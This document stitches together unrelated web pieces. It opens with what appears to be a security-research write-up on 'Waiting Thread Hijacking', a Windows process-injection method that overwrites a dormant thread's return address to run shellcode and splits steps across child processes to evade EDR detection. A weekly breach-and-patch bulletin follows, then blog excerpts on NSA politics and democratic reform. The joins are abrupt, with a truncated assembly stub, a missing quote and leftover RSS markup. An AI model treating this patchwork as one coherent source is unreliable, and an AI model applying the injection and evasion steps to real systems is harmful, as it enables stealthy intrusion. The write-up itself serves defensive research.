&lt;p&gt;Thread Pools are the way of optimizing the thread creation and task processing. Rather than creating a new thread each time when there is some new event to handle, we have a set of ready-made threads that are reused. Part of the Thread Pool architecture is the presence of work queue and waiter threads.&lt;/p&gt;



&lt;p&gt;By inspecting processes using tools like Process Explorer or&amp;nbsp;&lt;a href="https://systeminformer.com/"&gt;System Informer&lt;/a&gt;, you can observe the thread pool mechanism at work. Most of the default Windows processes consist of multiple threads, many of which are in a waiting state. The callstacks of those threads contain functions prefixed with&amp;nbsp;&lt;code&gt;Tp*&lt;/code&gt;&amp;nbsp;&amp;#8211; that stand for Thread Pool.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 2 - View from ProcessExplorer. Example of the callstack of a
thread belonging to a pool, and waiting in the WrQueue." src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId58.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 &amp;#8211; View from ProcessExplorer. Example of the callstack of a thread belonging to a pool, and waiting in the WrQueue.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="taking-advantage-of-thread-pools"&gt;Taking Advantage of Thread Pools&lt;/h2&gt;



&lt;p&gt;On any modern Windows system we find&amp;nbsp;&lt;a href="https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/"&gt;plenty of processes with waiting threads&lt;/a&gt;, that are managed by a Thread Pool. They can provide the building blocks to create a stealthier version of Thread Execution Hijacking.&lt;/p&gt;



&lt;p&gt;Rather than suspending and then resuming one of the existing threads, we can take advantage of one of the waiting threads that are dormant. These threads will automatically reactivate on the awaited event, giving us exactly the effect that we wanted to achieve, without the need of calling external APIs.&lt;/p&gt;



&lt;p&gt;Another problem to solve was related to changing the thread context. This time we won’t manipulate the instruction pointer directly. In the considered case, we are dealing with the thread that waits on a syscall for its completion. The last executed function was simply a corresponding syscall wrapper within NTDLL. Knowing that those wrappers use a very simple layout, we are sure that the last element on the stack is a return address. So, we can simply get the context of the thread, read the stack pointer, and then replace the return address with the pointer to our own code.&lt;/p&gt;



&lt;p&gt;All that is needed to perform those operations is a thread handle with&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights"&gt;&lt;code&gt;THREAD_GET_CONTEXT&lt;/code&gt;&lt;/a&gt;, and a process handle with the read/write permissions (&amp;nbsp;&lt;code&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights" rel="noreferrer noopener" target="_blank"&gt;PROCESS_VM_READ | PROCESS_VM_WRITE&lt;/a&gt;&lt;/code&gt;&amp;nbsp;).&lt;/p&gt;



&lt;p&gt;While interference in threads involving suspending/resuming and manual context setting will be blocked by most EDRs, this approach allows to avoid the common triggers and achieve the code execution.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="identifying-suitable-threads"&gt;Identifying Suitable Threads&lt;/h2&gt;



&lt;p&gt;In theory, any waiting thread, regardless of the wait reason, can be subject to hijacking. But of course we don’t want to introduce synchronization issues in the attacked application. One of the safe options is to pick threads with the wait reason&amp;nbsp;&lt;code&gt;WrQueue&lt;/code&gt;. This reason indicates that the thread is waiting on a&amp;nbsp;&lt;code&gt;KQUEUE&lt;/code&gt;&amp;nbsp;object, which is a kernel object used to manage queues of IRPs.&lt;/p&gt;



&lt;p&gt;To find them, we use the native function&amp;nbsp;&lt;code&gt;NtQuerySystemInformation&lt;/code&gt;&amp;nbsp;with a parameter&amp;nbsp;&lt;code&gt;SystemProcessInformation&lt;/code&gt;, allowing us to enumerate all processes and threads and extract useful information. For each thread, it retrieves the structure&amp;nbsp;&lt;a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/thread.htm"&gt;&lt;code&gt;SYSTEM_THREAD_INFORMATION&lt;/code&gt;&lt;/a&gt;. The field&amp;nbsp;&lt;code&gt;ThreadState&lt;/code&gt;&amp;nbsp;allows checking if the thread is currently waiting, and the&amp;nbsp;&lt;code&gt;WaitReason&lt;/code&gt;&amp;nbsp;gives more information on what caused it.&lt;/p&gt;



&lt;p&gt;The presence of the&amp;nbsp;&lt;code&gt;WrQueue&lt;/code&gt;&amp;nbsp;wait reason indicates that we are dealing with one of two possible scenarios.&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;The wait happens inside the&amp;nbsp;&lt;code&gt;NtRemoveIoCompletion&lt;/code&gt;&amp;nbsp;that was called by kernelbase →&amp;nbsp;&lt;code&gt;GetQueuedCompletionStatus&lt;/code&gt;:&lt;/li&gt;
&lt;/ol&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31353" height="270" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId66.png" width="866" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 &amp;#8211; Inside the function&amp;nbsp;&lt;code&gt;GetQueuedCompletionStatus&lt;/code&gt;&amp;nbsp;. The highlighted line shows the return address of the syscall wrapper.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;ol class="wp-block-list"&gt;
&lt;li&gt;The wait happens inside&amp;nbsp;&lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;&amp;nbsp;that was called by ntdll →&amp;nbsp;&lt;code&gt;TppWorkerThread&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 4 - Inside the function &amp;lt;code&amp;gt;TppWorkerThread&amp;lt;/code&amp;gt; . The
highlighted line shows the return address of the syscall wrapper." src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId69.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; Inside the function&amp;nbsp;&lt;code&gt;TppWorkerThread&lt;/code&gt;&amp;nbsp;. The highlighted line shows the return address of the syscall wrapper.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;&lt;em&gt;The original return address is highlighted in gray on each picture.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;In both cases, the situation is favorable for hijacking. The thread waits on syscall completion within a syscall wrapper function. Those wrappers do not create stack frames. The first argument at the top of the stack is the return address, leading back to the caller’s function.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="ensuring-a-happy-ending"&gt;Ensuring a Happy Ending&lt;/h2&gt;



&lt;p&gt;One of the important things to remember while implementing an injection method, is ensuring that after executing our code the target application won’t crash.&lt;/p&gt;



&lt;p&gt;In Waiting Thread Hijacking, we replace the original address with our own. So, once the wait finishes, the return address will be picked from the stack, and followed. Since now it is overwritten with the pointer to our shellcode, that will lead to the execution of the implant. However, we interrupted the normal execution flow of the function, so there is a risk to the stability of the target process. One way to prevent the crash at the end, is to make the shellcode never return &amp;#8211; i.e.&amp;nbsp;by making it stuck in the infinite&amp;nbsp;&lt;code&gt;Sleep&lt;/code&gt;&amp;nbsp;loop. But it is not the best solution. For example, we will miss processing some events for which the thread was originally waiting. While this might not cause a critical issue, it’s still suboptimal.&lt;/p&gt;



&lt;p&gt;Fortunately, restoring the original execution flow is relatively straightforward with an appropriate stub.&lt;/p&gt;



&lt;p&gt;The template:&lt;/p&gt;

jmp qword ptr ds:[SAVED_RET_PTR] ;jump to the original return address
[shellcode_main] ; the vital part of the shellcode&lt;/pre&gt;



&lt;p&gt;The stub starts from a free space of a pointer size. This is where the previous return address will be saved by the injector, before being replaced. The code starts after that. It saves the flags, and all the general purpose registers that may contain vital data needed to continue with normal execution later. With the context saved, we can now execute the shellcode responsible for any planned activity (in case of a PoC, that is, traditionally, popping up the calc.exe). After the main function returned, we restore the previously saved registers and flags, and then jump to the original return address.&lt;/p&gt;



&lt;p&gt;Let’s see it in action.&lt;/p&gt;



&lt;p&gt;Step 1 &amp;#8211; As the wait finished, the execution is about to follow the return address. In our case, the address on the stack has been replaced.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31355" height="223" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId73.png" width="880" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 &amp;#8211; Inside the syscall wrapper:&amp;nbsp;&lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;. Upon the syscall completion, the function will pick the first entry from the stack, that was overwritten, and use it as a return address.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Step 2 &amp;#8211; The shellcode starts execution from saving all the flags, and registers. They will be restored at the end, to recover the original values.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31356" height="435" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId76.png" width="975" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 &amp;#8211; View of the stub within the implanted shellcode. The right panel shows the values of the registers BEFORE the shellcode execution.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Step 3 &amp;#8211; The shellcode finished its execution. The registers are restored to the same state as they were in the beginning. The jump at the end of the shellcode will take us back to the original return address.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31357" height="461" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId79.png" width="981" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 &amp;#8211; View of the stub within the implanted shellcode. The right panel shows the values of the registers AFTER the shellcode execution.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Step 4 &amp;#8211; The execution returns to the original function.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 8 - After the implant finished, the execution flow returned to
the place where the syscall wrapper would normally return." src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId82.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; After the implant finished, the execution flow returned to the place where the syscall wrapper would normally return.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h1 class="wp-block-heading" id="implementation"&gt;Implementation&lt;/h1&gt;



&lt;p&gt;Having all those building blocks, let’s have a look at the final implementation.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31359" height="321" src="https://research.checkpoint.com/wp-content/uploads/2025/04/rId87.gif" width="621" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; Animation showing all the main steps of Waiting Thread Hijacking.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The writes (and possible allocation) are done in a standard way, using&amp;nbsp;&lt;code&gt;VirtualAllocEx&lt;/code&gt;&amp;nbsp;+&amp;nbsp;&lt;code&gt;WriteProcessMemory&lt;/code&gt;. After the shellcode is planted in the target, we proceed to set up for its execution. Enumerating all the threads in the process, we scan for those that are currently in a waiting mode, select one of them, and overwrite its return address. Once the thread switches back to the active mode, it will resume its execution returning to the replaced address, which now leads to the implant. After executing the implant, the thread should return seamlessly to its casual duties.&lt;/p&gt;

&lt;h1 class="wp-block-heading" id="execution-flow-obfuscation"&gt;Execution flow obfuscation&lt;/h1&gt;



&lt;p&gt;Some products base their detection on behavioral signatures, which consist of sequences of API calls made in conjunction. While a single write done to a remote process might get a pass, if the same process makes other interesting calls, it may create a marker of an injection technique.&lt;/p&gt;



&lt;p&gt;One way to throw off process-centric behavioral signatures is to apply a simple obfuscation and split each step of our technique into a different child process.&lt;/p&gt;



&lt;p&gt;In this model, allocation with read-write access is executed by the first process. The allocated address is then stored in an environment variable and passed to the next child process, which fills the new memory area with content. Then, the final child process changes the access rights of the allocated memory to read-execute. The last child process replaces the return pointer of the waiting thread, redirecting it to the previously written shellcode.&lt;/p&gt;



&lt;p&gt;We can also split the execution into three steps instead of four, if we’re willing to accept a small concurrency risk. Using Waiting Thread Hijacking, the execution of the implant is not instantaneous and instead depends on a received event. So, making the shellcode executable can be done as the last step, after the pointer on the stack was already replaced.&lt;/p&gt;



&lt;p&gt;A demo enriched with this obfuscation method is available when compiling the PoC with a flag:&amp;nbsp;&lt;code&gt;SPLIT_STEPS&lt;/code&gt;.&lt;/p&gt;



&lt;h1 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h1&gt;



&lt;p&gt;Waiting Thread Hijacking relies on writing to a remote process. However, some Endpoint Detection and Response (EDR) systems may prevent any attempt at remote write, effectively thwarting this technique.&lt;/p&gt;



&lt;p&gt;To overcome these limitations, it would be best to use an unconventional write (as demonstrated in the blog about Thread Name-Calling). But here comes the chicken-and-egg problem: to do so, we need to execute remotely some API. So, it defeats the purpose of this technique, which is stealthy execution. Techniques like&amp;nbsp;&lt;a href="https://undev.ninja/nina-x64-process-injection/"&gt;NINA&lt;/a&gt;&amp;nbsp;and&amp;nbsp;&lt;a href="https://blog.sevagas.com/IMG/pdf/code_injection_series_part5.pdf"&gt;GhostWriting&lt;/a&gt;&amp;nbsp;try to solve the write problem without using APCs (Asynchronous Procedure Calls), but they come with their own trade-offs. For example, they make use of&amp;nbsp;&lt;a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d"&gt;SetThreadContext&lt;/a&gt;, which is still detectable and blocked by many EDR systems.&lt;/p&gt;



&lt;p&gt;On the other hand, there are some products that are very restrictive about remote execution methods but more lenient about allocations and writes. In such cases, WTH can still be effective in hiding the point at which the implanted code was run, remaining undetected despite using a common write primitive.&lt;/p&gt;



&lt;p&gt;Different EDRs have different mechanisms of working, and by diversifying the arsenal of techniques, we can increase our success ratio in Red Teaming endeavors. Using WTH we were able to bypass some EDRs that stopped Thread Name-Calling. However, the opposite effect also occurred. No injection technique is perfect; each has its pros and cons, and as always, we are forced to trade off one suspicious indicator against another.&lt;/p&gt;



&lt;p&gt;This technique doesn’t use rare APIs or sophisticated structures. Thanks to this simplicity, it’s easy to implement, but harder to detect by statically analyzing the sample, i.e.&amp;nbsp;using YARA rules. All used APIs occur commonly in benign executables as well. The best way to catch it is by watching behavior, stopping remote writes immediately, or examining where they lead.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The United States Office of the Comptroller of the Currency (OCC), an independent bureau of the Department of the Treasury, has &lt;a href="https://www.bloomberg.com/news/articles/2025-04-08/hackers-spied-on-100-bank-regulators-emails-for-over-a-year"&gt;suffered&lt;/a&gt; a significant security breach. Threat actors have gained access to the bureau’s email messages for a period of a year and a half. According to the agency’s disclosure, the messages &lt;a href="https://occ.gov/news-issuances/news-releases/2025/nr-occ-2025-30.html"&gt;included&lt;/a&gt; “highly sensitive information relating to the financial condition of federally regulated financial institutions”.&lt;/li&gt;
&lt;li&gt;American car racing giant NASCAR has allegedly been &lt;a href="https://hackread.com/medusa-ransomware-claims-nascar-breach-latest-attack/"&gt;hit&lt;/a&gt; with a ransomware attack. The Medusa ransomware group claims to have breached NASCAR’s network, exfiltrated sensitive material and is demanding $4M in ransom. The group has begun leaking documents allegedly stolen from the company’s network.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point Harmony Endpoint and Threat Emulation provide protection against this threat &lt;/em&gt;&lt;em&gt;(Ransomware.Wins.MedusaLocker.ta.*; Ransomware.Wins.MedusaLocker.*; Trojan.WIN32.Medusalocker.*)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Morocco’s Institute of Social Security, CNSS, was &lt;a href="https://fr.le360.ma/economie/une-cyberattaque-revendiquee-par-des-hackers-algeriens-met-a-nu-la-vulnerabilite-de-la-cnss_XTETZCNIMFDURLZMCPKFESQTMM/"&gt;breached&lt;/a&gt; by an Algerian hacker group named ‘JabaROOT’. The group claims to have stolen personal information of 2 million Moroccan citizens, which includes personal as well as financial information, such as names, addresses and bank details. The threat group has also &lt;a href="https://therecord.media/morocco-investigates-breach-hackers-algeria"&gt;defaced&lt;/a&gt; the website of Morocco’s Ministry of Labor.&lt;/li&gt;
&lt;li&gt;Laboratory Services Cooperative, a Seattle-based nonprofit medical services provider, has &lt;a href="https://www.securityweek.com/1-6-million-people-impacted-by-data-breach-at-laboratory-services-cooperative/"&gt;disclosed&lt;/a&gt; that it had suffered a cyber-attack late last year. The threat actors have stolen personal and medical information of 1.6 million individuals, which includes Social Security numbers as well as diagnosis and treatment details. This information is considered particularly sensitive, as LSC provides services for Planned Parenthood patients.&lt;/li&gt;
&lt;li&gt;United States food manufacturer WK Kellogg Co has &lt;a href="https://www.bleepingcomputer.com/news/security/food-giant-wk-kellogg-discloses-data-breach-linked-to-clop-ransomware/"&gt;notified&lt;/a&gt; regulators that it had suffered a data breach. According to the company’s statement, it has learned that threat actors had gained access to a Cleo server that held sensitive employee information late last year. The Clop ransomware group, which has added WK Kellogg Co to its victim site, had exploited zero-day vulnerabilities in Cleo servers to breach a large number of companies last year.&lt;/li&gt;
&lt;/ul&gt;

&lt;li&gt;The Czech Republic’s Primer Minister’s X (formerly Twitter) account was &lt;a href="https://www.reuters.com/world/europe/czech-pm-fialas-x-account-attacked-with-fake-posts-2025-04-08/"&gt;hacked&lt;/a&gt; and used to publish false posts. The posts involved foreign policy, including announcements of a fake attack by Russia on Czech Republic soldiers, as well as a fake Czech response to the United States’ tariffs. According to the Czech Prime Minister, foreign threat actors &lt;a href="https://x.com/P_Fiala/status/1909545522794578219"&gt;were&lt;/a&gt; responsible for the breach.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Microsoft has &lt;a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-april-2025-patch-tuesday-fixes-exploited-zero-day-134-flaws/"&gt;released&lt;/a&gt; April’s Patch Tuesday, addressing a total of 134 vulnerabilities across the company&amp;#8217;s products. Among the vulnerabilities, 11 are considered Critical, and one (CVE-2025-29824) was an actively exploited zero-day vulnerability in Windows CLFS, which was used to deliver ransomware. Microsoft has also &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/04/08/exploitation-of-clfs-zero-day-leads-to-ransomware-activity/"&gt;published&lt;/a&gt; an in-depth report regarding ransomware group Storm-2460’s exploitation of the vulnerability.&lt;/li&gt;
&lt;li&gt;Adobe has &lt;a href="https://helpx.adobe.com/security/security-bulletin.html"&gt;published&lt;/a&gt; 12 security advisories addressing 54 vulnerabilities across the company&amp;#8217;s products. Of the vulnerabilities, 30 &lt;a href="https://helpx.adobe.com/security/products/coldfusion/apsb25-15.html"&gt;affected&lt;/a&gt; Adobe ColdFusion, 11 of which were tagged as critical, and could be exploited to gain arbitrary code execution and file read.&lt;/li&gt;
&lt;li&gt;Google has &lt;a href="https://source.android.com/docs/security/bulletin/2025-04-01"&gt;released&lt;/a&gt; April&amp;#8217;s security patch for Android. The patch addresses 62 vulnerabilities in total, including 2 zero-day vulnerabilities affecting Android devices. Among them is CVE-2024-53197, a privilege escalation flaw in devices’ Linux Kernel&amp;#8217;s USB audio component. This vulnerability was allegedly recently &lt;a href="https://www.infosecurity-magazine.com/news/android-update-address-two-zero/"&gt;exploited&lt;/a&gt; by Israeli firm Cellebrite for Serbia&amp;#8217;s law enforcement agencies.&lt;/li&gt;
&lt;li&gt;Meta has &lt;a href="https://www.facebook.com/security/advisories/CVE-2025-30401?lsrc=lb"&gt;disclosed&lt;/a&gt; a vulnerability affecting WhatsApp Windows Desktop client. The vulnerability, CVE-2025-30401, involved displaying attachments according to their MIME type, but opening them based on the file’s name. This &lt;a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/whatsapp-for-windows-bug-lets-attackers-obfuscate-malware-in-attachments"&gt;allowed&lt;/a&gt; attackers to send malicious executables that would appear as JPEG images.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://blog.checkpoint.com/security/march-2025-malware-spotlight-fakeupdates-and-ransomhub-ransomware-group-dominate-cyber-threats/"&gt;released&lt;/a&gt; March 2025’s Most Wanted Malware report, showing the continued dominance of FakeUpdates, a downloader malware that remains the most prevalent threat worldwide. Meanwhile, education remains the most impacted industry globally, with both malware and ransomware attacks increasingly targeting this sector.&lt;/li&gt;

The blog offers tips on how to recognize these cyber threats and how to proactively protect yourself.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://securelist.com/toddycat-apt-exploits-vulnerability-in-eset-software-for-dll-proxying/116086/"&gt;discovered&lt;/a&gt; a campaign by APT group ‘ToddyCat’ exploiting CVE-2024-11859, a vulnerability in ESET’s Command line scanner, which is a security solution. This attack vector allowed the threat actors to operate undetected within a trusted security ecosystem, as they used the Command line scanner to load malicious payloads.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"&gt;identified&lt;/a&gt; a new campaign by Russia-aligned APT group Shuckworm, which tends to target Ukrainian entities with espionage payloads. This campaign targeted a foreign military mission stationed in Ukraine and used an updated variant of the GamaSteel payload to maintain persistence, exfiltrate data, and conduct surveillance.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I have been thinking of that quote a lot as I read &lt;a href="https://www.nytimes.com/2025/04/05/us/politics/nsa-director-haugh-trump-loomer.html"&gt;news&lt;/a&gt; &lt;a href="https://www.washingtonpost.com/national-security/2025/04/03/nsa-director-fired-tim-haugh/"&gt;stories&lt;/a&gt; &lt;a href="https://apnews.com/article/trump-national-security-agency-tim-haugh-ec08b455e2c1112f5c6bb1881fad73e2"&gt;of&lt;/a&gt; President Trump firing the Director of the National Security Agency.

&lt;blockquote&gt;&lt;p&gt;We don&amp;#8217;t know what pressure the Trump administration is using to make intelligence services fall into line, but it isn&amp;#8217;t crazy to &lt;a href="https://www.theguardian.com/us-news/2024/apr/16/house-fisa-government-surveillance-senate"&gt;worry&lt;/a&gt; that the NSA might again start monitoring domestic communications.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;The NSA &lt;a href="https://www.eff.org/nsa-spying"&gt;already&lt;/a&gt; &lt;a href="https://www.aclu.org/news/national-security/five-things-to-know-about-nsa-mass-surveillance-and-the-coming-fight-in-congress"&gt;spies&lt;/a&gt; &lt;a href="https://epic.org/documents/in-re-epic-nsa-telephone-records-surveillance/"&gt;on&lt;/a&gt; &lt;a href="https://foreignpolicy.com/2016/09/07/every-move-you-make-obama-nsa-security-surveillance-spying-intelligence-snowden/"&gt;Americans&lt;/a&gt; in a &lt;a href="https://www.eff.org/nsa-spying/timeline"&gt;variety of ways&lt;/a&gt;. But that&amp;#8217;s always been a sideline to its main mission: spying on the rest of the world. Once Trump replaces Haugh with a loyalist, the NSA&amp;#8217;s vast surveillance apparatus can be refocused domestically.&lt;/p&gt;
&lt;p&gt;Giving that agency all those powers in the 1990s, in the 2000s after the terrorist attacks of 9/11, and in the 2010s was always a mistake. I fear that we are about to learn how big a mistake it was.&lt;/p&gt;
&lt;p&gt;Here&amp;#8217;s PGP creator Phil Zimmerman in 1996, &lt;a href="https://philzimmermann.com/EN/testimony/index.html"&gt;spelling it out&lt;/a&gt; even more clearly:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;The Clinton Administration seems to be attempting to deploy and entrench a communications infrastructure that would deny the citizenry the ability to protect its privacy. This is unsettling because in a democracy, it is possible for bad people to occasionally get elected&amp;#8212;sometimes very bad people. Normally, a well-functioning democracy has ways to remove these people from power. But the wrong technology infrastructure could allow such a future government to watch every move anyone makes to oppose it. It could very well be the last government we ever elect.&lt;/p&gt;
&lt;p&gt;When making public policy decisions about new technologies for the government, I think one should ask oneself which technologies would best strengthen the hand of a police state. Then, do not allow the government to deploy those technologies. This is simply a matter of good civic hygiene.&lt;/p&gt;&lt;/blockquote&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=70093</guid><category>Uncategorized</category><category>national security policy</category><category>NSA</category><category>privacy</category><category>surveillance</category></item><item><title>Reimagining Democracy</title><link>https://www.schneier.com/blog/archives/2025/04/reimagining-democracy-2.html</link><description>&lt;p&gt;Imagine that all of us&amp;#8212;all of society&amp;#8212;have landed on some alien planet and need to form a government: clean slate.

We do not have any legacy systems from the United States or any other country. We do not have any special or unique interests to perturb our thinking. How would we govern ourselves? It is unlikely that we would use the systems we have today. Modern representative democracy was the best form of government that eighteenth-century technology could invent. The twenty-first century is very different: scientifically, technically, and philosophically. For example, eighteenth-century democracy was designed under the assumption that travel and communications were both hard.&lt;/p&gt;
&lt;p&gt;Indeed, the very idea of representative government was a hack to get around technological limitations. Voting is easier now. Does it still make sense for all of us living in the same place to organize every few years and choose one of us to go to a single big room far away and make laws in our name? Representative districts are organized around geography because that was the only way that made sense two hundred-plus years ago. But we do not need to do it that way anymore. We could organize representation by age: one representative for the thirty-year-olds, another for the forty-year-olds, and so on. We could organize representation randomly: by birthday, perhaps. We can organize in any way we want. American citizens currently elect people to federal posts for terms ranging from two to six years. Would ten years be better for some posts? Would ten days be better for others? There are lots of possibilities. Maybe we can make more use of direct democracy by way of plebiscites. Certainly we do not want all of us, individually, to vote on every amendment to every bill, but what is the optimal balance between votes made in our name and ballot initiatives that we all vote on?&lt;/p&gt;
&lt;p&gt;For the past three years, I have organized a series of annual two-day workshops to discuss these and other such questions.&lt;sup&gt;1&lt;/sup&gt; For each event, I brought together fifty people from around the world: political scientists, economists, law professors, experts in artificial intelligence, activists, government types, historians, science-fiction writers, and more. We did not come up with any answers to our questions&amp;#8212;and I would have been surprised if we had&amp;#8212;but several themes emerged from the event. Misinformation and propaganda was a theme, of course, and the inability to engage in rational policy discussions when we cannot agree on facts. The deleterious effects of optimizing a political system for economic outcomes was another theme. Given the ability to start over, would anyone design a system of government for the near-term financial interest of the wealthiest few? Another theme was capitalism and how it is or is not intertwined with democracy. While the modern market economy made a lot of sense in the industrial age, it is starting to fray in the information age. What comes after capitalism, and how will it affect the way we govern ourselves?&lt;/p&gt;
&lt;p&gt;Many participants examined the effects of technology, especially artificial intelligence (AI). We looked at whether&amp;#8212;and when&amp;#8212;we might be comfortable ceding power to an AI system. Sometimes deciding is easy. I am happy for an AI system to figure out the optimal timing of traffic lights to ensure the smoothest flow of cars through my city. When will we be able to say the same thing about the setting of interest rates? Or taxation? How would we feel about an AI device in our pocket that voted in our name, thousands of times per day, based on preferences that it inferred from our actions? Or how would we feel if an AI system could determine optimal policy solutions that balanced every voter&amp;#8217;s preferences: Would it still make sense to have a legislature and representatives? Possibly we should vote directly for ideas and goals instead, and then leave the details to the computers.&lt;/p&gt;
&lt;p&gt;These conversations became more pointed in the second and third years of our workshop, after generative AI exploded onto the internet. Large language models are poised to write laws, enforce both laws and regulations, act as lawyers and judges, and plan political strategy. How this capacity will compare to human expertise and capability is still unclear, but the technology is changing quickly and dramatically. We will not have AI legislators anytime soon, but just as today we accept that all political speeches are professionally written by speechwriters, will we accept that future political speeches will all be written by AI devices? Will legislators accept AI-written legislation, especially when that legislation includes a level of detail that human-based legislation generally does not? And if so, how will that change affect the balance of power between the legislature and the administrative state? Most interestingly, what happens when the AI tools we use to both write and enforce laws start to suggest policy options that are beyond human understanding? Will we accept them, because they work? Or will we reject a system of governance where humans are only nominally in charge?&lt;/p&gt;
&lt;p&gt;Scale was another theme of the workshops. The size of modern governments reflects the technology at the time of their founding. European countries and the early American states are a particular size because that was a governable size in the eighteenth and nineteenth centuries. Larger governments&amp;#8212;those of the United States as a whole and of the European Union&amp;#8212;reflect a world where travel and communications are easier. Today, though, the problems we have are either local, at the scale of cities and towns, or global. Do we really have need for a political unit the size of France or Virginia? Or is it a mixture of scales that we really need, one that moves effectively between the local and the global?&lt;/p&gt;
&lt;p&gt;As to other forms of democracy, we discussed one from history and another made possible by today&amp;#8217;s technology. Sortition is a system of choosing political officials randomly. We use it today when we pick juries, but both the ancient Greeks and some cities in Renaissance Italy used it to select major political officials. Today, several countries&amp;#8212;largely in Europe&amp;#8212;are using the process to decide policy on complex issues. We might randomly choose a few hundred people, representative of the population, to spend a few weeks being briefed by experts, debating the issues, and then deciding on environmental regulations, or a budget, or pretty much anything.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Liquid democracy&amp;#8221; is a way of doing away with elections altogether. The idea is that everyone has a vote and can assign it to anyone they choose. A representative collects the proxies assigned to him or her and can either vote directly on the issues or assign all the proxies to someone else. Perhaps proxies could be divided: this person for economic matters, another for health matters, a third for national defense, and so on. In the purer forms of this system, people might transfer their votes to someone else at any time. There would be no more election days: vote counts might change every day.&lt;/p&gt;
&lt;p&gt;And then, there is the question of participation and, more generally, whose interests are taken into account. Early democracies were really not democracies at all; they limited participation by gender, race, and land ownership. These days, to achieve a more comprehensive electorate we could lower the voting age. But, of course, even children too young to vote have rights, and in some cases so do other species. Should future generations be given a &amp;#8220;voice,&amp;#8221; whatever that means? What about nonhumans, or whole ecosystems? Should everyone have the same volume and type of voice? Right now, in the United States, the very wealthy have much more influence than others do. Should we encode that superiority explicitly? Perhaps younger people should have a more powerful vote than everyone else. Or maybe older people should.&lt;/p&gt;
